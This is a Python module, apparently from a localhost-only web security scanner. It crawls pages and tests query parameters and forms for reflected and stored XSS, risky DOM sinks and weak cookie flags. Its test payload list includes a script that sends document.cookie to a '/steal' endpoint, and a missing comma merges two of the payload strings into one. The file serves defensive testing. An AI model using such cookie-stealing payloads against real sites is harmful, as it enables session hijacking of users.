"""
XSS scanning logic module (moved from attack.py)
"""
import requests
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, urlunparse, ParseResult
from bs4 import BeautifulSoup
import collections
import time
import re
from http.cookies import SimpleCookie

# --- Configuration ---
TEST_PAYLOADS = [
    "<penny_test_1>",
    "\"><img src=x onerror=console.log(1)>",
    "<script>console.log('penny')</script>"
      "<script>document.location='http://127.0.0.1:8000/steal?cookie='+document.cookie</script>",
      "<script>document.write('document.cookie='+document.cookie)</script>",
]
ALLOWED_HOSTS = ("localhost", "127.0.0.1")
MAX_PAGES = 200
MAX_DEPTH = 4
REQUEST_TIMEOUT = 6
DOM_RISK_PATTERNS = [
    "innerHTML", "outerHTML", "document.write", "document.writeln",
    "location.hash", "location.search", "eval(", "setAttribute(", "insertAdjacentHTML"
]

def is_allowed_target(url):
    try:
        p = urlparse(url)
        return p.hostname in ALLOWED_HOSTS
    except Exception:
        return False

def same_origin(a, b):
    pa, pb = urlparse(a), urlparse(b)
    port_a = pa.port if pa.port is not None else (443 if pa.scheme == "https" else 80)
    port_b = pb.port if pb.port is not None else (443 if pb.scheme == "https" else 80)
    return (pa.hostname == pb.hostname) and (port_a == port_b)

def normalize_url(base, link):
    return urljoin(base, link.split('#')[0])

def inject_into_query(url, param, payload):
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [payload]
    new_query = urlencode(qs, doseq=True)
    new_parsed = ParseResult(parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment)
    return urlunparse(new_parsed)

def find_reflection(resp_text, marker):
    return marker in resp_text

def scan_cookie_security(response, url):
    findings = []
    parsed_url = urlparse(url)
    is_https = parsed_url.scheme == 'https'
    set_cookies = response.headers.getall('Set-Cookie') if 'Set-Cookie' in response.headers else []
    if not set_cookies:
        set_cookies = response.headers.getall('set-cookie') if 'set-cookie' in response.headers else []
    for set_cookie in set_cookies:
        try:
            cookie = SimpleCookie(set_cookie)
            for key, morsel in cookie.items():
                httponly = 'httponly' in morsel
                secure = 'secure' in morsel
                samesite = morsel.get('samesite', '').lower()
                sensitive_keywords = ['session', 'token', 'auth', 'id', 'user', 'login', 'secret', 'csrf']
                is_sensitive = any(keyword in key.lower() for keyword in sensitive_keywords)
                if not httponly:
                    findings.append({
                        "type": "cookie-security",
                        "subtype": "missing-httponly",
                        "cookie_name": key,
                        "url": url,
                        "secure": secure,
                        "httponly": httponly,
                        "sensitive": is_sensitive
                    })
                if is_https and not secure:
                    findings.append({
                        "type": "cookie-security",
                        "subtype": "missing-secure",
                        "cookie_name": key,
                        "url": url,
                        "secure": secure,
                        "httponly": httponly,
                        "sensitive": is_sensitive
                    })
                if samesite not in ('strict', 'lax'):
                    findings.append({
                        "type": "cookie-security",
                        "subtype": "weak-samesite",
                        "cookie_name": key,
                        "url": url,
                        "samesite": samesite or 'none',
                        "httponly": httponly,
                        "sensitive": is_sensitive
                    })
                if is_sensitive and not httponly:
                    findings.append({
                        "type": "cookie-security",
                        "subtype": "sensitive-data-exposure",
                        "cookie_name": key,
                        "url": url,
                        "secure": secure,
                        "httponly": httponly,
                        "sensitive": is_sensitive
                    })
        except Exception as e:
            print(f"Error parsing Set-Cookie header: {e}")
    html = response.text
    js_cookie_patterns = [
        r'document\.cookie\s*=\s*["\']([^"\']+)["\']',
        r'document\.cookie\s*=\s*([^;]+)',
        r'\.cookie\s*=\s*["\']([^"\']+)["\']'
    ]
    for pattern in js_cookie_patterns:
        matches = re.findall(pattern, html, re.IGNORECASE)
        for match in matches:
            findings.append({
                "type": "cookie-security",
                "subtype": "js-cookie-set",
                "url": url,
                "match": match[:50] + "..." if len(match) > 50 else match
            })
    return findings

def scan_reflected(url, session):
    findings = []
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    if not qs:
        params_to_test = ['p']
        base = url.split('?',1)[0]
    else:
        base = url.split('?',1)[0]
        params_to_test = list(qs.keys())
    for param in params_to_test:
        for payload in TEST_PAYLOADS:
            test_url = inject_into_query(base + ("?" + parsed.query if parsed.query else ""), param, payload)
            try:
                r = session.get(test_url, timeout=REQUEST_TIMEOUT)
                if find_reflection(r.text, payload):
                    findings.append({"type":"reflected","url":test_url,"param":param,"payload":payload})
            except Exception as e:
                print(f"  request error (reflected test) for {test_url}: {e}")
    return findings

def parse_forms(html, base_url):
    soup = BeautifulSoup(html, "html.parser")
    forms = []
    for form in soup.find_all("form"):
        action = form.get("action")
        method = (form.get("method") or "get").lower()
        form_url = normalize_url(base_url, action) if action else base_url
        inputs = {}
        for inp in form.find_all(["input","textarea","select"]):
            name = inp.get("name")
            if not name:
                continue
            itype = (inp.get("type") or "").lower()
            if itype in ("checkbox","radio"):
                value = inp.get("value", "on")
            elif inp.name == "textarea":
                value = inp.text or ""
            else:
                value = inp.get("value", "")
            inputs[name] = value
        forms.append({"url": form_url, "method": method, "fields": inputs})
    return forms

def scan_forms(url, session, forms):
    findings = []
    for form in forms:
        target = form["url"]
        method = form["method"]
        fields = form["fields"]
        for field in list(fields.keys()):
            for payload in TEST_PAYLOADS:
                data = {k: (payload if k == field else (fields[k] or "test")) for k in fields.keys()}
                try:
                    if method == "post":
                        r = session.post(target, data=data, timeout=REQUEST_TIMEOUT)
                    else:
                        r = session.get(target, params=data, timeout=REQUEST_TIMEOUT)
                    if payload in r.text:
                        findings.append({"type":"form-injection","target":target,"field":field,"payload":payload,"method":method})
                except Exception as e:
                    print(f"  form request error to {target}: {e}")
    return findings

def scan_dom_risks(html, base_url):
    findings = []
    soup = BeautifulSoup(html, "html.parser")
    for script in soup.find_all("script"):
        script_text = script.string or ""
        if script_text:
            for pat in DOM_RISK_PATTERNS:
                if pat in script_text:
                    findings.append({"type":"dom-risk-inline","url":base_url,"pattern":pat})
    for script in soup.find_all("script", src=True):
        src = script['src']
        findings.append({"type":"dom-risk-src","url":normalize_url(base_url, src),"pattern":"external-script"})
    for tag in soup.find_all(True):
        for attr in ("onerror","onclick","onload","onmouseover"):
            if tag.has_attr(attr):
                findings.append({"type":"dom-risk-attribute","url":base_url,"attribute":attr,"tag":tag.name})
    return findings

def crawl_and_scan(start_url):
    if not is_allowed_target(start_url):
        print("ERROR: start URL must be on localhost or 127.0.0.1 for safety.")
        return None
    session = requests.Session()
    session.headers.update({"User-Agent": "PennyWiseLocalScanner/1.0"})
    seen = set()
    queue = collections.deque()
    queue.append((start_url, 0))
    summary_findings = []
    while queue and len(seen) < MAX_PAGES:
        url, depth = queue.popleft()
        if url in seen:
            continue
        if depth > MAX_DEPTH:
            continue
        try:
            r = session.get(url, timeout=REQUEST_TIMEOUT)
        except Exception as e:
            print(f"Failed to GET {url}: {e}")
            seen.add(url)
            continue
        cookie_findings = scan_cookie_security(r, url)
        summary_findings.extend(cookie_findings)
        content_type = r.headers.get("Content-Type","")
        if "text/html" in content_type:
            html = r.text
            dom_find = scan_dom_risks(html, url)
            summary_findings.extend(dom_find)
            forms = parse_forms(html, url)
            forms_find = scan_forms(url, session, forms)
            summary_findings.extend(forms_find)
            ref_find = scan_reflected(url, session)
            summary_findings.extend(ref_find)
            soup = BeautifulSoup(html, "html.parser")
            for link in soup.find_all("a", href=True):
                nxt = normalize_url(url, link['href'])
                if same_origin(start_url, nxt):
                    if nxt not in seen:
                        queue.append((nxt, depth+1))
            for form in forms:
                if same_origin(start_url, form["url"]) and form["url"] not in seen:
                    queue.append((form["url"], depth+1))
        seen.add(url)
        time.sleep(0.05)
    return summary_findings

def categorize_findings(summary_findings):
    categorized = {
        "Reflected XSS candidates": [],
        "Stored XSS candidates (form POST)": [],
        "Form-based reflected (GET) candidates": [],
        "DOM-based risks": [],
        "Cookie Security Issues": [],
        "Other/Misc": []
    }
    for f in summary_findings:
        typ = f.get("type")
        if typ == "reflected":
            categorized["Reflected XSS candidates"].append(f)
        elif typ == "form-injection":
            method = f.get("method", "").lower()
            if method == "post":
                categorized["Stored XSS candidates (form POST)"].append(f)
            else:
                categorized["Form-based reflected (GET) candidates"].append(f)
        elif typ and typ.startswith("dom-risk"):
            categorized["DOM-based risks"].append(f)
        elif typ == "cookie-security":
            categorized["Cookie Security Issues"].append(f)
        else:
            categorized["Other/Misc"].append(f)
    return categorized
